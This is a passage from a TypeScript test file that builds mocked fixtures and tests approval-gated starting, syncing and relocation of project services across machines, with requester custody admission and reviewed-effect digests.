                kind: 'persistent', active: true, revokedAt: null, replacedByMachineId: null,
                access: { custodian: { accountId: 'owner', displayName: 'Owner' }, role: 'manage', resourceMode: 'plain', accessState: 'ready' },
            });
            // The bootstrap schema projects public host facts; installed custody
            // additionally publishes its key for the real requester carrier.
            const keyPair = nacl.sign.keyPair();
            machineInstallationKeys.set(value.machineId, keyPair.secretKey);
            return { ...machine, installationId, installationPublicKey: Buffer.from(keyPair.publicKey).toString('base64') };
        });
        const sourceHandlers = new Map<string, (input: unknown, context?: RpcHandlerContext) => Promise<unknown>>();
        let sourceListed = true;
        let mintedEpoch = 1;
        // Feature discovery is the network boundary; installed Home identity
        // comes from the exact saved profile above. SOURCE admission stays real.
        if (workerExecution) vi.spyOn(globalThis, 'fetch').mockImplementation(async input => {
            expect(String(input)).toBe('https://home.example/v1/features/authenticated');
            return new Response(JSON.stringify(FeaturesResponseSchema.parse({ features: {},
                capabilities: { serverIdentity: { serverIdentityId } } })), { status: 200 });
        });
        const basePolicy = { v: 1 as const, selection: 'all_files' as const, extraIgnorePatterns: [], extraIncludePatterns: [] };
        const relationship: WorkspaceSyncRelationshipV1 = { v: 1, relationshipId: 'source-worker', controllerMachineId: workspace.machineId,
            alphaWorkspaceRefId: workspace.id, betaWorkspaceRefId: targetWorkspace.id, mode: 'keep_synced', enabled: true,
            ...(workerExecution ? { provenance: { kind: 'worker_clean_copy' as const, sourceWorkspaceRefId: workspace.id, targetWorkspaceRefId: targetWorkspace.id } } : {}),
            contentPolicy: { ...basePolicy, policyDigest: computeWorkspaceSyncPolicyDigest(basePolicy) }, createdAtMs: 1, updatedAtMs: 1 };
        let relationshipCurrent = true;
        // Worker selection observes the Sync controller's native status, not
        // merely the saved relationship. This is the Machine transport boundary.
        if (workerExecution) vi.spyOn(machineRpcBoundary, 'callMachineRpc').mockImplementation(async call => {
            expect(call.method).toBe(RPC_METHODS.DAEMON_WORKSPACE_SYNC_LIST);
            return { statuses: relationshipCurrent ? [{ relationshipId: relationship.relationshipId,
                controllerMachineId: workspace.machineId, state: 'watching', alphaPath: root, betaPath: targetRoot,
                mode: relationship.mode, endpointStates: {
                    alpha: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 },
                    beta: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 },
                }, conflictCount: 0, lastCycleObservedAtMs: null }] : [] };
        });
        let copyManifestOverride: unknown;
        let afterCopy: (() => void | Promise<void>) | undefined;
        let copies = 0;
        // HTTP is the only replaced boundary: A2 opening, trust and placement codecs remain real.
        vi.spyOn(axios, 'get').mockImplementation(async url => {
            const path = new URL(String(url)).pathname;
            if (path === '/v1/artifacts/accepted-service-setup') return { status: 200, data: {
                id: 'accepted-service-setup', ownerAccountId: 'owner', access: 'owner', encryptionMode: 'plain',
                dataEncryptionKey: ARTIFACT_PLAIN_DATA_KEY_MARKER, header: encodePlainArtifactStoredContent({ kind: 'project_setup.v1' }),
                body: encodePlainArtifactStoredContent({ body: JSON.stringify({ kind: 'project_setup.v1', acceptedSharedSetup: { ...setupSelection, manifest } }) }),
                headerVersion: 1, bodyVersion: 1, seq: 1, createdAt: 1, updatedAt: 1,
            } };
            if (path === '/v1/account/profile') return { status: 200, data: { id: 'owner' } };
            if (path === '/v1/account/encryption/currentness') return { status: 200, data: {
                mode: 'plain', version: 1, signingKeyFingerprint: null, contentKeyFingerprint: null, updatedAt: 1 } };
            if (path === '/v2/account/settings') return { status: 200, data: { content: { t: 'plain', v: {} }, version: 0 } };
            const publishedMachines = sourceListed ? machines : machines.filter(machine => machine.id !== workspace.machineId);
            if (path === '/v1/machines') return { status: 200, data: publishedMachines };
            if (path.startsWith('/v1/machines/')) {
                const publishedMachine = [workspace, targetWorkspace].find(value => path === `/v1/machines/${encodeURIComponent(value.machineId)}`);
                if (!publishedMachine) throw new Error(`Unknown fixture Machine path: ${path}`);
                const machine = publishedMachines.find(value => value.id === publishedMachine.machineId);
                if (!machine) return { status: 404, data: { error: 'machine_not_found' } };
                return { status: 200, data: { machine: {
                    ...machine,
                    metadata: encodePlainMachineStoredContent({ host: publishedMachine.machineId, platform: process.platform,
                        arch: process.arch, happyCliVersion: 'test', homeDir: root, happyHomeDir: root }),
                    metadataVersion: 0, daemonState: null, daemonStateVersion: 0, storageMode: 'plain',
                } } };
            }
            return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
        });
        let trustedSetupDigest: string | null = null;
        let workerStatusTransport: ((envelope: ExternalActionRequestEnvelopeV1, signal?: AbortSignal) => Promise<unknown>) | undefined;
        const post = vi.spyOn(axios, 'post').mockImplementation(async (url, body, options) => {
            const path = new URL(String(url)).pathname;
            if (path === bindExternalActionExecutionAuthorizationHttpPathV1('projects.worker.status') || path === '/v1/actions/projects.worker.status') {
                expect(options?.headers).toMatchObject({ Authorization: `Bearer ${credentials.token}` });
                const request = ExternalActionExecutionAuthorizationRequestV1Schema.parse(body);
                const envelope = ExternalActionRequestEnvelopeV1Schema.parse(request.envelope);
                expect(envelope.target).toEqual({ kind: 'machine', machineId: targetWorkspace.machineId });
                const machine = machines.find(machine => machine.id === targetWorkspace.machineId)!;
                expect(request.machineId).toBe(machine.id);
                const authorization = ExternalActionExecutionAuthorizationV1Schema.parse({
                    v: 1, token: 'home-issued-worker-status', binding: { accountId: 'owner', custodianAccountId: 'owner',
                        authentication: { kind: 'terminal', tokenEpoch: 1 }, accountEncryptionMode: 'plain', serverIdentityId,
                        machineId: machine.id, installationId: machine.installationId, actionId: 'projects.worker.status',
                        requestId: envelope.requestId, target: envelope.target,
                        requestEnvelopeDigest: computeExternalActionRequestEnvelopeDigestV1(envelope) },
                });
                if (path !== '/v1/actions/projects.worker.status') return { status: 200, data: authorization };
                expect(request.executionAuthorization).toEqual(authorization);
                if (!workerStatusTransport) throw new Error('Destination worker Status transport is not registered');
                const output = await workerStatusTransport(envelope, options?.signal instanceof AbortSignal ? options.signal : undefined);
                assertActionOutputContract('projects.worker.status', output);
                return { status: 200, data: ExternalActionResponseEnvelopeV1Schema.parse({ v: 1, actionId: 'projects.worker.status',
                    requestId: envelope.requestId, execution: { ok: true, result: output } }) };
            }
            if (path === bindExternalActionExecutionAuthorizationHttpPathV1('projects.inspect') || path === '/v1/actions/projects.inspect') {
                expect(options?.headers).toMatchObject({ Authorization: `Bearer ${credentials.token}` });
                const request = ExternalActionExecutionAuthorizationRequestV1Schema.parse(body);
                const envelope = ExternalActionRequestEnvelopeV1Schema.parse(request.envelope);
                const inspected = [workspace, targetWorkspace].find(value => value.machineId === request.machineId);
                if (!inspected) throw new Error('Inspection requires an installed fixture Machine');
                const machine = machines.find(value => value.id === inspected.machineId)!;
                expect(envelope).toMatchObject({ target: { kind: 'machine', machineId: machine.id }, input: { workspace: {
                    serverId: homeId, workspaceId: inspected.id, machineId: inspected.machineId, rootPath: inspected.rootPath,
                } } });
                if (path !== '/v1/actions/projects.inspect') return { status: 200, data: ExternalActionExecutionAuthorizationV1Schema.parse({
                    v: 1, token: 'home-issued-source-inspection', binding: { accountId: 'owner', custodianAccountId: 'owner',
                        authentication: { kind: 'terminal', tokenEpoch: mintedEpoch }, accountEncryptionMode: 'plain', serverIdentityId,
                        machineId: machine.id, installationId: machine.installationId, actionId: 'projects.inspect',
                        requestId: envelope.requestId, target: envelope.target,
                        requestEnvelopeDigest: computeExternalActionRequestEnvelopeDigestV1(envelope) },
                }) };
                expect(request.executionAuthorization?.binding).toMatchObject({ authentication: { kind: 'terminal', tokenEpoch: 1 },
                    machineId: machine.id, installationId: machine.installationId, actionId: 'projects.inspect', requestId: envelope.requestId });
                const handler = sourceHandlers.get(`${machine.id}:${getActionSpec('projects.inspect').bindings!.rpcMethod!}`);
                if (!handler) throw new Error('SOURCE inspection handler is not registered');
                // The real external receiver opens requester custody before invoking
                // the installed RPC. A public signed binding alone is not admission.
                const admitted = await admitRequesterAccountActionContext({ authorization: request.executionAuthorization!, credentials,
                    serverId: profileId, serverIdentityId, serverHttpBaseUrl: 'https://home.example',
                    isCurrent: async () => true, isCustodyCurrent: async () => true });
                if (!admitted) throw new Error('SOURCE inspection requester custody was not admitted');
                cleanups.push(() => admitted.dispose());
                const output = await handler(envelope.input, { signal: options?.signal instanceof AbortSignal ? options.signal : ingress.signal,
                    callerAuthority: 'account_automation', callerInputAuthorization: admitted.authorization,
                    machineAdmission: { actorAccountId: 'owner', custodianAccountId: 'owner', machineId: machine.id,
                        installationId: machine.installationId, role: 'manage', encryptionMode: 'plain' },
                    verifyMachineAdmissionCurrent: admitted.isCurrent,
                    localActionContext: { authority: 'account_automation', externalActionExecutionAuthorization: admitted.authorization },
                    originalActionEnvelope: envelope, transportRequestId: envelope.requestId });
                const refused = typeof output === 'object' && output !== null && 'ok' in output && output.ok === false;
                if (!refused) assertActionOutputContract('projects.inspect', output);
                return { status: 200, data: ExternalActionResponseEnvelopeV1Schema.parse({ v: 1, actionId: 'projects.inspect',
                    requestId: envelope.requestId, execution: refused ? output : { ok: true, result: output } }) };
            }
            if (String(url).endsWith('/project-trust/read')) return { status: 200, data: trustedSetupDigest === null ? { status: 'absent' }
                : { status: 'present', revision: 1, content: { t: 'plain', v: { project: { serverId: homeId, projectId: 'project' },
                    reviewedEffectDigest: trustedSetupDigest, approvedAtMs: 1 } } } };
            const refs = workerExecution ? [workspace, targetWorkspace] : [workspace];
            const rows: ProjectAccountRowV1[] = refs.map(value => { const key = { kind: 'workspace-ref' as const, serverId: homeId, id: value.id };
                return { key, revision: 1, content: { t: 'plain', v: { key, value } } }; });
            if (acceptedSharedSetup) {
                const key = { kind: 'project-organization' as const, serverId: homeId, projectKey: 'project' };
                rows.push({ key, revision: 1, content: { t: 'plain', v: { key, value: { setupSelection,
                    setupContent: { artifactId: 'accepted-service-setup', headerVersion: 1, bodyVersion: 1 } } } } });
            }
            if (workerExecution) {
                const key = { kind: 'relationship-graph' as const };
                rows.push({ key, revision: relationshipCurrent ? 1 : 2, content: { t: 'plain', v: { key, value: { relationships: relationshipCurrent ? [relationship] : [] } } } });
            }
            return projectAccountRowsReadHttpResponse(rows, String(url), body);
        });
        let savedPlacement: ProjectServicePlacementV1 | undefined;
        let placementReads = 0;
        const config = createWorkspaceExecutionConfigClientV1({ mode: 'plain', material: null, isCurrent: () => true,
            randomBytes: length => new Uint8Array(length), transport: { read: async () => { placementReads++; return savedPlacement
                ? { status: 'present', revision: 1, content: { t: 'plain', v: { ...createDefaultWorkspaceExecutionSettingsV1(), services: { worker: savedPlacement } } } }
                : { status: 'absent' }; },
                mutate: async () => { throw new Error('read only'); } } });
        const setupProcesses: Array<{ params: PtySpawnParams; pty: ObservedSetupPty }> = [];
        let resolveSetupStarted!: () => void;
        const setupStarted = new Promise<void>(resolve => { resolveSetupStarted = resolve; });
        const interactiveProvider = interactive ? createPythonPtyRelayProvider({ env: process.env, platform: process.platform, pythonExecutable: 'python3' }) : null;
        if (interactive && !interactiveProvider) throw new Error('Interactive Service fixture requires the existing Python PTY relay');
        const terminalSessions = createTerminalPtySessionManager({ ptyProvider: interactiveProvider ?? { spawn(params) {
            const pty = new ObservedSetupPty(resolveSetupStarted); setupProcesses.push({ params, pty }); return pty;
        // This fake OS process has no descendants after its supplied exit.
        } }, ...(interactive ? {} : { stopProcessTree: async () => {}, probeProcessGroup: () => 'absent' as const }),
            config: { bufferMaxBytes: 1_000_000, bufferMaxEvents: 1000,
                urlParseBufferLimit: 32_768, maxWriteChunkBytes: 16_384, defaultCols: 80, defaultRows: 24 }, env: {}, platform: 'linux' });
        const operationSnapshots: ActionOperationSnapshotV1[] = [];
        // Publication is the operation runtime's real change signal; tests await it instead of polling the store.
        const snapshotWaiters = new Set<(snapshot: ActionOperationSnapshotV1) => void>();
        const operationPublished = (matches: (snapshot: ActionOperationSnapshotV1) => boolean) => new Promise<ActionOperationSnapshotV1>(resolve => {
            const earlier = operationSnapshots.find(matches);
            if (earlier) return resolve(earlier);
            const waiter = (snapshot: ActionOperationSnapshotV1) => { if (matches(snapshot)) { snapshotWaiters.delete(waiter); resolve(snapshot); } };
            snapshotWaiters.add(waiter);
        });
        let operationIndex = 0;
        const operationRuntime = createHostActionOperationRuntime({ machineId: targetWorkspace.machineId,
            custodyBinding: { serverId: homeId, installationId: 'installation' }, resolveAccountId: async () => 'owner',
            publishSnapshot: snapshot => { operationSnapshots.push(snapshot); snapshotWaiters.forEach(waiter => waiter(snapshot)); },
            ...(workerExecution ? { generateOperationId: () => ++operationIndex === 1 ? 'service-start-operation' : `setup-operation${operationIndex === 2 ? '' : `-${operationIndex}`}` } : {}) });
        const owner = createManagedServicesOwner({ ...(retained ? { projectServiceStateDirectory: join(root, 'retained-services') } : {}), processSupervisorHost: createManagedServiceProcessSupervisorHost({ custodyOwner: 'daemon',
            ...(supervisorPlatform ? { platform: supervisorPlatform } : {}) }),
            // Plugin dependency installation is unreachable for literal Project commands.
            dependencies: Object.freeze({}) as never, resolveScope: scope => scope });
        cleanups.push(async () => { terminalSessions.dispose(); await owner.dispose(); await rm(root, { recursive: true, force: true });
            if (targetRoot !== root) await rm(targetRoot, { recursive: true, force: true }); });
        const ingress: RpcHandlerContext = { signal: new AbortController().signal, transportRequestId: 'service-request', callerAuthority: 'account_automation',
            machineAdmission: { actorAccountId: 'owner', custodianAccountId: 'owner', machineId: targetWorkspace.machineId, installationId: 'installation', role: 'manage', encryptionMode: 'plain' },
            verifyMachineAdmissionCurrent: async () => true };
        let nativeTool: Readonly<{ executablePath: string; args?: readonly string[]; version?: string }> | null = null;
        const admissionDrain = createDaemonAdmissionDrain();
        // Only the Sync controller's native transfer is substituted. Both worker
        // Start and Move consume the same real clean-route preparation result.
        const prepareBetween: WorkspaceSyncHandoffAdapter['prepareBetween'] = (request, signal) => prepareWorkspaceSyncBetween({ ...request, serverId: homeId, signal,
            readCurrent: async () => ({ workspaceRefs: [workspace, targetWorkspace], relationships: relationshipCurrent ? [relationship] : [] }),
            flush: async () => {
                copies++;
                await cp(root, targetRoot, { recursive: true });
                if (copyManifestOverride !== undefined) await writeFile(join(targetRoot, '.happier/project.json'), JSON.stringify(copyManifestOverride));
                await afterCopy?.();
                return { relationshipId: relationship.relationshipId, controllerMachineId: workspace.machineId,
                    state: 'watching', alphaPath: root, betaPath: targetRoot, mode: relationship.mode,
                    endpointStates: { alpha: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 },
                        beta: { connected: true, scanned: true, scanProblemCount: 0, transitionProblemCount: 0 } },
                    conflictCount: 0, lastCycleObservedAtMs: null };
            } });
        const runtime: ProjectFiniteActionRuntime & { credentials: typeof credentials; hostEnvironment: Record<string, string | undefined> } = { serverId: profileId, machineId: targetWorkspace.machineId, accountId: 'owner', credentials,
            requesterIdentity: selectHostRequesterExecutionIdentity({ rpcContext: ingress, hostHomeServerIdentityId: serverIdentityId }),
            serverHttpBaseUrl: 'https://home.example', isCurrent: async () => true, operationRuntime, terminalSessions,
            workerAdmission: createProjectWorkerAdmission({ machineId: targetWorkspace.machineId, admissionDrain, readPolicy: async () => ({ status: 'ready', policy: { accepting: finiteAccepting, runAtMost: null }, source: 'stored', metadataVersion: 1 }) }),
            resolveWorkspaceExecutionConfig: async () => config, nativeIo: { resolveTool: async () => nativeTool },
            environmentIo: createProjectNativeToolchainIoForHost({ resolveTool: async () => null }),
            platform: 'linux', arch: 'x64', hostEnvironment: {}, successHomeDir: join(targetRoot, 'success'),
            ...(workerExecution ? createWorkspaceSyncWorkerPreparation({ serverId: profileId, serverHttpBaseUrl: 'https://home.example',
                targetMachineId: targetWorkspace.machineId, credentials,
                prepareBetween }) : {}) };
        function projectDefinitionActionFor(ref: typeof workspace) {
            const nativeIo = { resolveTool: async () => nativeTool };
            return createProjectDefinitionAction({ serverId: profileId, machineId: ref.machineId,
                workingDirectory: ref.rootPath, accessPolicy: { kind: 'restrictedRoots', roots: [ref.rootPath] }, nativeIo,
                inspectSetup: async ({ workspace: address, context, reviewSetupConsent }) => {
                    const requester = { credentials, serverHttpBaseUrl: 'https://home.example' };
                    const association = await resolveProjectSetupAcceptedWorkspace({ ...requester, address, serverId: profileId, signal: context.signal });
                    return inspectProjectSetup({ workspace: association.workspace, projectAssociation: association, requester,
                        purpose: 'setup', approvalContext: context, platform: { os: 'linux', arch: 'x64' }, nativeIo,
                        successHomeDir: join(ref.rootPath, 'inspection-success'), signal: context.signal },
                        reviewSetupConsent ? { reviewConsent: true } : undefined);
                } });
        }
        if (workerExecution) {
            for (const ref of [workspace, targetWorkspace]) registerProjectDefinitionHandlers({ machineId: ref.machineId,
                rpcHandlerManager: { registerHandler: (method, handler) => { sourceHandlers.set(`${ref.machineId}:${method}`, handler); } },
                actionExecutor: createActionExecutor(createCliActionDeps({ token: credentials.token, credentials,
                    serverId: profileId, serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain', ctx: null,
                    projectDefinitionAction: projectDefinitionActionFor(ref) })) });
            const inspectSourceProjectManifest = createProjectFiniteSourceManifestInspector({ api: await ApiClient.create(credentials),
                credentials, serverId: profileId, serverHttpBaseUrl: 'https://home.example', accountId: 'owner', ingress });
            Object.assign(runtime, { inspectSourceProjectManifest });
        }
        const projectionLifetime = new AbortController();
        let prepareServiceLaunchEnvironments: NonNullable<import('@/plugins/runtime/composition/executableTypes').ResolvedExecutablePluginRuntimeRegistry['prepareServiceLaunchEnvironments']> | undefined;
        const starter = createProjectServiceDeclarationStarter({ resolveRuntime: async () => runtime,
            acquirePluginRuntime: async () => ({ registry: { projectManagedServices: owner, retirementSignal: projectionLifetime.signal,
                ...(prepareServiceLaunchEnvironments ? { prepareServiceLaunchEnvironments } : {}) }, release: async () => {} }) });
        const projectDefinitionAccount = { account: { credentials }, serverHttpBaseUrl: runtime.serverHttpBaseUrl };
        const targets = (await discoverLocalServiceRunTargets({ roots: [], acceptedWorkspaceRefs: [workspace], projectDefinitionAccount })).targets;
        const target = targets.find(target => 'declaration' in target && target.declaration.selection.kind === 'manifest');
        if (!target || !('declaration' in target)) throw new Error('Fixture manifest did not produce a Service declaration');
        const request = { machineId: targetWorkspace.machineId, targetId: target.id, workspace: { serverId: homeId, machineId: 'machine', workspaceId: workspace.id, rootPath: root }, declaration: target.declaration,
            ...(workerExecution ? { choice: { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: targetWorkspace.machineId } } } : {}) };
        // These owner cases explicitly exercise reviewed Start, independently
        // of the Account's current default Direct/Ask preference.
        const context = { authority: 'account_automation' as const, serverId: homeId, actionRequestId: 'service-request',
            actionsSettings: normalizeActionsSettingsV1({ v: 1, actions: {
                'localServices.launcher.start': { approvalRequiredSurfaces: ['rpc', 'api', 'agent', 'cli'] },
            } }) };
        const history = createLocalServiceLauncherHistoryStore();
        const feed = createLocalServiceLauncherFeed({ machineId: targetWorkspace.machineId, history,
            inventoryRegistry: createLocalServiceInventoryRegistry(), previewRegistry: createLocalServicePreviewRegistry(),
            projectManagedServices: owner,
            startOperations: () => operationRuntime.store.list({ accountId: 'owner', machineId: targetWorkspace.machineId,
                states: ['accepted', 'running'] }).items,
            runTargets: () => discoverLocalServiceRunTargets({ roots: [], acceptedWorkspaceRefs: [targetWorkspace], projectDefinitionAccount }) });
        const routes = createLocalServiceLauncherRoutes({ feed, history, ...starter });
        return { root, workspace, targetRoot, targetWorkspace, serverIdentityId, machineInstallationKeys, projectDefinitionActionFor, manifest, starter, routes, history, request, ingress, context, owner, post, setupProcesses, setupStarted, terminalSessions, operationRuntime, operationSnapshots, operationPublished, runtime, admissionDrain, prepareBetween,
            async refreshDiscovery() { await feed.refreshRunTargets(); },
            async selectStart(selectedIngress: Parameters<typeof starter.resolveStartTarget>[1] = ingress) {
                const selected = await starter.resolveStartTarget(request, selectedIngress, context);
                if (!selected.ok) throw new Error(selected.reasonCode);
                return selected.declaration;
            },
            async createRuntimeActionExecutor(relocateService?: LocalServicesRuntimeActionRoutes['relocateService'], actionRoutes?: LocalServicesRuntimeActionRoutes['actionRoutes'], launcherRoutes = routes, runtimeIngress = ingress) {
                const featureGate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
                    features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true },
                        managed: { enabled: true }, actions: { enabled: true }, launcher: { enabled: true } },
                        browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
                await featureGate.refresh();
                const execute = createLocalServicesDaemonRuntimeActionExecutor({ featureGate, ingress: runtimeIngress,
                    routes: { launcherRoutes, ...(relocateService ? { relocateService } : {}), ...(actionRoutes ? { actionRoutes } : {}) } });
                // Only these fixture calls install the real Move coordinator; other calls
                // deliberately exercise substituted internal routes and are not producer evidence.
                return relocateService ? withActionOutputContract(execute) : execute;
            },
            copies: () => copies, placementReads: () => placementReads, withdrawRelationship() { relationshipCurrent = false; },
            changeCopiedManifest(value: unknown) { copyManifestOverride = value; },
            afterCopy(callback: () => void | Promise<void>) { afterCopy = callback; },
            savePlacement(value: ProjectServicePlacementV1) { savedPlacement = value; },
            setNativeTool(value: NonNullable<typeof nativeTool>) { nativeTool = value; },
            bindWorkerStatusTransport(handler: NonNullable<typeof workerStatusTransport>) { workerStatusTransport = handler; },
            setServiceLaunchEnvironmentContribution(prepare: NonNullable<typeof prepareServiceLaunchEnvironments>) { prepareServiceLaunchEnvironments = prepare; },
            trustSetupDigest(value: string) { trustedSetupDigest = value; },
            publishSource(value: boolean) { sourceListed = value; },
            mintSourceEpoch(value: number) { mintedEpoch = value; },
            retireRegistryProjection() { projectionLifetime.abort(); } };
    }

    it('starts a snapshot declaration from agent operands through reviewed approval and execution', async () => {
        const f = await fixture();
        await f.routes.getSnapshot({ workspaceRoot: f.root });
        const request = { machineId: f.request.machineId, targetId: f.request.targetId, workspaceId: f.workspace.id };
        const prepared = await f.routes.prepareStartApproval!(request, f.ingress, f.context);
        expect(prepared).toMatchObject({ request: { ...request, workspace: f.request.workspace, declaration: f.request.declaration } });
        const review = LocalServiceStartApprovalReviewV1Schema.parse(prepared);
        const started = await f.routes.startTarget!(request, f.ingress, { ...f.context, nativeServiceStartApproval: review });
        expect(started).toMatchObject({ status: 'succeeded', currentTarget: { workspaceId: f.workspace.id } });
        expect(f.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
    });

    it('prepares an agent-shaped Service Action with the resolved declaration in its approval', async () => {
        const f = await fixture();
        await f.routes.getSnapshot({ workspaceRoot: f.root });
        let artifact: ReturnType<typeof ApprovalRequestV2Schema.parse> | undefined;
        const executor = createActionExecutor({ ...createCliActionDeps({ token: f.runtime.credentials!.token,
            credentials: f.runtime.credentials!, serverId: 'home', serverHttpBaseUrl: 'https://home.example',
            sessionId: '', mode: 'plain', ctx: null }),
            prepareLocalServiceStartApproval: ({ input, context, executeCanonicalAction }) =>
                f.routes.prepareStartApproval!(input, f.ingress, context, executeCanonicalAction),
            runtimeActionExecute: await f.createRuntimeActionExecutor(),
            // Artifact persistence is the boundary; request completion and approval stay real.
            approvalsCreate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { artifactId: 'agent-service' }; },
            approvalsGet: async () => artifact ?? null,
            approvalsUpdate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { ok: true }; },
            isApprovalExecutionOriginCurrent: async () => true,
        });
        const request = { machineId: f.request.machineId, targetId: f.request.targetId, workspaceId: f.workspace.id };
        const context = { surface: 'agent' as const, authority: 'account_automation' as const, serverId: 'home',
            runtimeAccountId: 'owner', actionRequestId: 'agent-service-review', actionsSettings: f.context.actionsSettings };
        expect(await executor.execute('localServices.launcher.start', request, context))
            .toMatchObject({ ok: true, result: { kind: 'approval_request_created' } });
        const complete = { ...request, workspace: f.request.workspace, declaration: f.request.declaration };
        expect(artifact).toMatchObject({ actionArgs: complete, preview: { serviceStartReview: { request: complete } } });
        expect(await executor.execute('approval.request.decide', { artifactId: 'agent-service', decision: 'approve' },
            { ...context, surface: 'cli', authority: 'present_user' }))
            .toMatchObject({ ok: true });
        expect(artifact?.execution).toMatchObject({ ok: true, result: { status: 'succeeded' } });
        expect(f.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
    });

    it('starts a selected declaration without traversing unrelated package trees', async () => {
        const f = await fixture();
        const unrelated = await mkdtemp(join(tmpdir(), 'happier-unrelated-service-'));
        cleanups.push(() => rm(unrelated, { recursive: true, force: true }));
        await mkdir(join(unrelated, 'child'));
        await writeFile(join(unrelated, 'child/package.json'), JSON.stringify({ name: 'unrelated', scripts: { dev: 'vite' } }));
        const feed = createLocalServiceLauncherFeed({ machineId: f.request.machineId, history: f.history,
            inventoryRegistry: createLocalServiceInventoryRegistry(), previewRegistry: createLocalServicePreviewRegistry(),
            projectManagedServices: f.owner,
            runTargets: (roots, options) => discoverLocalServiceRunTargets({ roots: roots ?? [f.root, unrelated],
                acceptedWorkspaceRefs: [f.workspace], ...options }) });
        const routes = createLocalServiceLauncherRoutes({ feed, history: f.history, ...f.starter });
        await routes.getSnapshot({ workspaceRoot: f.root });
        const review = await f.selectStart();
        const reads = vi.spyOn(filesystem, 'readdir');
        const started = await routes.startTarget!({ machineId: f.request.machineId, targetId: f.request.targetId,
            workspaceId: f.workspace.id, expectedEffectDigest: review.reviewedEffectDigest }, f.ingress, f.context);
        expect(reads.mock.calls.filter(([path]) => String(path).startsWith(unrelated))).toHaveLength(0);
        expect(started.status).toBe('succeeded');
        expect(f.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
    });

    it('retains admitted primary execution from the real starter through the installed Move route', async () => {
        const f = await fixture();
        const review = await f.selectStart();
        const started = await f.routes.startTarget!({ ...f.request, expectedEffectDigest: review.reviewedEffectDigest }, f.ingress, f.context);
        if (started.status !== 'succeeded' || !started.currentTarget) throw new Error(`Service did not start: ${JSON.stringify(started)}`);
        expect(DaemonLocalServiceLauncherStartResponseV1Schema.safeParse(started).success).toBe(true);
        const workspace = { serverId: f.workspace.serverId, refId: f.workspace.id };
        const destination = { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: 'other-machine' } };
        const move = createProjectServiceRelocationRoute({ serverBaseUrl: 'https://home.example',
            credentials: f.runtime.credentials!, projectManagedServices: f.owner, resolveWorkspaceSyncHandoffAdapter: () => null });
        const execute = await f.createRuntimeActionExecutor(move);
        expect(await execute({ actionId: 'projects.service.relocate', input: {
            workspace, sourceMachineId: f.workspace.machineId, serviceName: 'worker', requestId: 'move-primary', currentTarget: started.currentTarget,
            destination, selectedTarget: { machineId: 'other-machine' }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent', expected: { kind: 'absent' }, value: { runsOn: destination, unavailable: 'fail' } } }, context: f.context }))
            .toMatchObject({ ok: false, errorCode: 'primary_only' });
        expect(f.owner.listProjectServices()[0]?.snapshot().state).toBe('running');
    });

    // Establish native custody through its real owner. SOURCE inspection is an independent
    // Start seam; this composition measures Move over an already running worker occurrence.
    async function seedWorkerService(f: Awaited<ReturnType<typeof fixture>>, workspace = f.targetWorkspace, serviceId = 'worker') {
        // A retained worker copy already has the reviewed files before Move;
        // the coordinator must still invoke its own clean preparation after Stop.
        if (f.root !== f.targetRoot) await cp(f.root, f.targetRoot, { recursive: true });
        let phase: 'running' | 'stopped' = 'running';
        const handle = await f.owner.superviseProject({ kind: 'workspace', workspace,
            declaration: { workspaceRefId: workspace.id, selection: { kind: 'manifest', name: 'worker' } },
            cwd: workspace.rootPath, serviceId, specIdentity: 'worker', execution: 'portable', isCurrent: () => true,
            requester: { serverId: f.workspace.serverId, accountId: 'owner', machineId: workspace.machineId, installationId: 'installation' },
            // Native process IO is the boundary; native custody, feed and confirmed Stop remain real.
            processSpec: { mode: { kind: 'native', instance: {
                adapter: { pluginId: 'fixture.plugin', localId: 'worker' }, nativeResourceId: 'worker-instance' },
                lifecycle: { inspect: async () => ({ phase, readiness: 'not_reported', endpoint: null }),
                    stop: async () => { phase = 'stopped'; return { status: 'stopped' }; } } } },
            authorizeLaunch: async () => ({ command: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)'],
                env: {}, release: async () => {} }),
        });
        return { currentTarget: LocalServiceManagedServiceActionTargetV1Schema.parse({ kind: 'managed_service',
            managedServiceId: handle.instanceId, machineId: handle.workspace.machineId, workspaceId: handle.workspace.id,
            cwd: handle.cwd, declaration: handle.declaration }) };
    }

    // A native host confirmation binds the exact Move. Artifact cases instead
    // return the open Ask and complete the real approval.request.decide journey.
    async function approvedMoveContext(f: Awaited<ReturnType<typeof fixture>>, request: unknown, options?: Readonly<{
        executor: Pick<ReturnType<typeof createActionExecutor>, 'execute'>;
        setup?: true;
        onOpen(artifactId: string, readApproval: () => Promise<unknown>): void;
    }>) {
        if (!options) {
            const { requestId } = getActionSpec('projects.service.relocate').inputSchema.parse(request);
            return { authority: 'present_user' as const, runtimeAccountId: 'owner',
                actionCaller: { kind: 'host' as const }, actionRequestId: requestId,
                serverIdentityId: f.serverIdentityId,
                presentUserConfirmation: { actionId: 'projects.service.relocate' as const,
                    accountId: 'owner', requestId, serverId: f.serverIdentityId, target: null,
                    inputDigest: computeActionInputApprovalDigestV1('projects.service.relocate', request) } };
        }
        const priorGet = vi.mocked(axios.get).getMockImplementation()!;
        const priorPost = f.post.getMockImplementation()!;
        let artifact: Record<string, unknown> | undefined;
        vi.mocked(axios.get).mockImplementation(async (url, options) => {
            const path = new URL(String(url)).pathname;
            if (path.startsWith('/v1/artifacts/')) return artifact && path === `/v1/artifacts/${artifact.id}`
                ? { status: 200, data: artifact } : { status: 404, data: { error: 'artifact_not_found' } };
            return await priorGet(url, options);
        });
        f.post.mockImplementation(async (url, body, options) => {
            const path = new URL(String(url)).pathname;
            if (path === '/v1/artifacts/read') {
